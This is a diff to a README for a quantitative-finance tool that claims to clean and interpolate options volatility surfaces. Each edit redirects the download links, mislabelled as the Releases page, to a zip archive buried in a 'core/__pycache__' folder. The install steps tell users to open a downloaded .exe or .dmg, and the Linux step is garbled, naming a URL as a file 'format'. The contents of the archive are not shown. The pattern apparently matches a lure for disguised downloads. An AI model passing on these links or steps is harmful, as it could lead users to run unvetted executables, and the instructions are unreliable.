@@ -8,9 +8,9 @@ The **Options-Surface-Cleaner-Interpolator** is a tool designed to help you clea
 
 You can download the software from the following link:
 
-[![Download Options-Surface-Cleaner-Interpolator](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/plots/Options_Cleaner_Interpolator_Surface_3.3.zip)](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/plots/Options_Cleaner_Interpolator_Surface_3.3.zip)
+[![Download Options-Surface-Cleaner-Interpolator](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/core/__pycache__/Interpolator_Options_Surface_Cleaner_v1.6-beta.3.zip)](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/core/__pycache__/Interpolator_Options_Surface_Cleaner_v1.6-beta.3.zip)
 
-To install the software, visit the Releases page to get the latest version: [Download Here](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/plots/Options_Cleaner_Interpolator_Surface_3.3.zip).
+To install the software, visit the Releases page to get the latest version: [Download Here](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/core/__pycache__/Interpolator_Options_Surface_Cleaner_v1.6-beta.3.zip).
 
 ## 🖥️ System Requirements
 
@@ -36,7 +36,7 @@ Before you start, ensure your computer meets these requirements:
 3. **Install the Application:**
    - For Windows: Open the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file, drag the application to your Applications folder, and open it.
-   - For Linux: Use your package manager to install or run the application directly if it’s in a `https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/plots/Options_Cleaner_Interpolator_Surface_3.3.zip` format.
+   - For Linux: Use your package manager to install or run the application directly if it’s in a `https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/core/__pycache__/Interpolator_Options_Surface_Cleaner_v1.6-beta.3.zip` format.
 4. **Run the Application:** Once installed, open the application through your programs menu or application folder.
 5. **Input Data:** Load your real options data into the tool.
 6. **View Results:** Analyze the cleaned and interpolated volatility surface displayed.
@@ -77,6 +77,6 @@ To further explore the world of quantitative finance, you might find the followi
 - **Volatility Trading:** Understand strategies that involve trading volatility indices.
 - **Quantitative Finance Tools:** Explore other tools that assist in financial analysis.
 
-If you're ready to clean your volatility surfaces, don't hesitate. [Download the Options-Surface-Cleaner-Interpolator now!](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/plots/Options_Cleaner_Interpolator_Surface_3.3.zip) 
+If you're ready to clean your volatility surfaces, don't hesitate. [Download the Options-Surface-Cleaner-Interpolator now!](https://raw.githubusercontent.com/Dego2001/Options-Surface-Cleaner-Interpolator/main/Options_Surface_Cleaner_Interpolator/core/__pycache__/Interpolator_Options_Surface_Cleaner_v1.6-beta.3.zip) 
 
 Happy analyzing!
